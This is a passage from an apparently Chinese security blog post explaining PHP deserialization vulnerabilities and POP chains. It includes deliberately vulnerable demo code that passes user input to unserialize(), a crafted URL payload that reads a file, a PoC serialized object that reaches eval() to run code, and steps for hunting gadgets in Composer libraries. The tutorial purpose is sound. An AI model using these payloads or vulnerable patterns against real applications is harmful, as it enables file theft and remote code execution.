+<p>常见的注入点<br>上一部分展示了由于输入可控造成的__destruct函数删除任意文件，其实问题也可能存在于__wakeup、__sleep、__toString等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个__toString，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许__toString读取某个文件。<br>现在开始这个小实验，代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test9.php&#x27;;</span><br><span class="line">$fileobj = new fileclass();</span><br><span class="line">$fileobj-&gt;filename = &#x27;hello.txt&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($fileobj);</span><br><span class="line">?&gt;</span><br><span class="line">//test8.php</span><br></pre></td></tr></table></figure>
+
+<p>我们先访问test8.php，结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class fileclass</span><br><span class="line">&#123;</span><br><span class="line">    //文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //当对象被作为一个字符串会读取这个文件</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class user</span><br><span class="line">&#123;</span><br><span class="line">    //class data</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //允许对象作为一个字符串输出上面的data</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;user &#x27;.$this-&gt;name.&#x27; is &#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//用户可控</span><br><span class="line">$obj = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">//输出__toString</span><br><span class="line">echo $obj</span><br><span class="line">?&gt;</span><br><span class="line">//test9.php</span><br></pre></td></tr></table></figure>
+
+<p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问：<br>可以看到hello.txt的内容：</p>
+<h2 id="2-利用普通成员方法"><a href="#2-利用普通成员方法" class="headerlink" title="2.利用普通成员方法"></a>2.利用普通成员方法</h2><p>在反序列化的时候，当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;CodeMonster&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从代码上来看，来通过new 实例化一个新的l1nk3r对象后，调用<code>__construct()</code>，其中该函数又new了一个新的CodeMonster对象；这个对象的功能是定义了action()函数，并且打印CodeMonster。然后结束的时候调用<code>__destruct()</code>,在<code>__destruct()</code>会调用action()，因此页面会输出CodeMonster。</p>
+<p><img src="3igq4.png" alt="8"></p>
+<p>但是在代码中，我们看得到codermaster1对象中有一个eval()函数，这可是危险函数啊，那有什么方法，通过发序列化触发它呢，当然有了。刚刚在l1nk3r对象中，new的是CodeMonster，如果new的是CodeMonster1，那么自然就会进入CodeMonster1中，然后eval()函数中的<code>$test2</code>可控制，那么自然就可以实现远程代码执行了。</p>
+<p>Poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">print_r(serialize($class6));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成的序列化字符串：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;l1nk3r&quot;:1:&#123;s:4:&quot;test&quot;;O:11:&quot;CodeMonster1&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="2o48f.png" alt="9"></p>
+<h1 id="查找反序列化漏洞及构造exploit的方法"><a href="#查找反序列化漏洞及构造exploit的方法" class="headerlink" title="查找反序列化漏洞及构造exploit的方法"></a>查找反序列化漏洞及构造exploit的方法</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>PHP的 unserialize() 函数只能反序列化在当前程序上下文中已经被定义过的类.在传统的PHP中你需要通过使用一大串的include() 或者 require()来包含所需的类定义文件。于是后来出现了 autoloading 技术,他可以自动导入需要使用的类,再也不需要程序员不断地复制粘贴 那些include代码了。这种技术同时也方便了我们的漏洞利用.因为在我们找到一个反序列化点的时候我们所能使用的类就多了,那么实现漏洞利用的可能性也就更加高。</p>
+<p>还有一个东西要提一下,那就是Composer,这是一个php的包管理工具,同时他还能自动导入所以依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面又增大不少。</p>
+<p>1.Composer配置的依赖库存储在vendor目录下</p>
+<p>2.如果要使用Composer的自动类加载机制,只需要在php文件的开头加上</p>
+<p><code>require __DIR__ . &#39;/vendor/autoload.php&#39;</code>;</p>
+<h2 id="漏洞发现技巧"><a href="#漏洞发现技巧" class="headerlink" title="漏洞发现技巧"></a>漏洞发现技巧</h2><p>默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</p>
+<p>找PHP链的基本思路.</p>
+<p>1.在各大流行的包中搜索 <code>__wakeup()</code> 和 <code>__destruct()</code> 函数.</p>
+<p>2.追踪调用过程</p>
+<p>3.手工构造 并验证 POP 链</p>
+<p>4.开发一个应用使用该库和自动加载机制,来测试exploit.</p>
+<h2 id="构造exploit的思路"><a href="#构造exploit的思路" class="headerlink" title="构造exploit的思路"></a>构造exploit的思路</h2><p>1.寻找可能存在漏洞的应用</p>
+<p>2.在他所使用的库中寻找 POP gadgets</p>
+<p>3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload</p>
+<p>4.将序列化之后的payload发送到有漏洞web应用中进行测试.</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">http://example.com/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">漏洞总结</a><a class="post-meta__tags" href="/tags/php/">php</a></div><div class="post_share"><div class="social-share" data-image="/imgg/7.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"><img class="prev-cover" src="/imgg/4.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">phpinfo信息利用</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"><img class="next-cover" src="/imgg/3.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2017-15715漏洞复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/" title="Redis未授权复现与利用"><img class="cover" src="/imgg/8.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-18</div><div class="title">Redis未授权复现与利用</div></div></a></div><div><a href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/" title="phpinfo信息利用"><img class="cover" src="/imgg/4.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">phpinfo信息利用</div></div></a></div><div><a href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习"><img class="cover" src="/imgg/5.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-25</div><div class="title">php反序列化练习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化和反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#serialize%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">serialize函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unserialize"><span class="toc-number">5.</span> <span class="toc-text">unserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%87%A0%E4%B8%AA%E5%8F%AF%E7%94%A8%E7%9A%84POP%E9%93%BE%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">1.几个可用的POP链方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-POP%E9%93%BEdemo%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.3.</span> <span class="toc-text">2.POP链demo示例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">反序列化漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%AD%89"><span class="toc-number">6.1.</span> <span class="toc-text">1.利用构造函数等</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%99%AE%E9%80%9A%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text">2.利用普通成员方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%9E%84%E9%80%A0exploit%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">查找反序列化漏洞及构造exploit的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">7.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E6%8A%80%E5%B7%A7"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞发现技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exploit%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">7.3.</span> <span class="toc-text">构造exploit的思路</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E8%81%94%E7%B3%BB/" title="从下水道尝试看懂php和联系"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从下水道尝试看懂php和联系"/></a><div class="content"><a class="title" href="/2021/11/28/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E8%81%94%E7%B3%BB/" title="从下水道尝试看懂php和联系">从下水道尝试看懂php和联系</a><time datetime="2021-11-28T06:12:36.000Z" title="Created 2021-11-28 14:12:36">2021-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/22/js%E7%AC%94%E8%AE%B0/" title="js笔记"><img src="/imgg/js.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js笔记"/></a><div class="content"><a class="title" href="/2021/11/22/js%E7%AC%94%E8%AE%B0/" title="js笔记">js笔记</a><time datetime="2021-11-22T06:14:21.000Z" title="Created 2021-11-22 14:14:21">2021-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/" title="vulstrack(三)挨打实录"><img src="/imgg/vul2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulstrack(三)挨打实录"/></a><div class="content"><a class="title" href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/" title="vulstrack(三)挨打实录">vulstrack(三)挨打实录</a><time datetime="2021-11-19T09:36:11.000Z" title="Created 2021-11-19 17:36:11">2021-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" title="vulstrack（一）"><img src="/imgg/vul1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulstrack（一）"/></a><div class="content"><a class="title" href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" title="vulstrack（一）">vulstrack（一）</a><time datetime="2021-11-13T05:09:04.000Z" title="Created 2021-11-13 13:09:04">2021-11-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/" title="cfs三层靶机挨打记录"><img src="/imgg/2.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="cfs三层靶机挨打记录"/></a><div class="content"><a class="title" href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/" title="cfs三层靶机挨打记录">cfs三层靶机挨打记录</a><time datetime="2021-09-18T09:56:29.000Z" title="Created 2021-09-18 17:56:29">2021-09-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
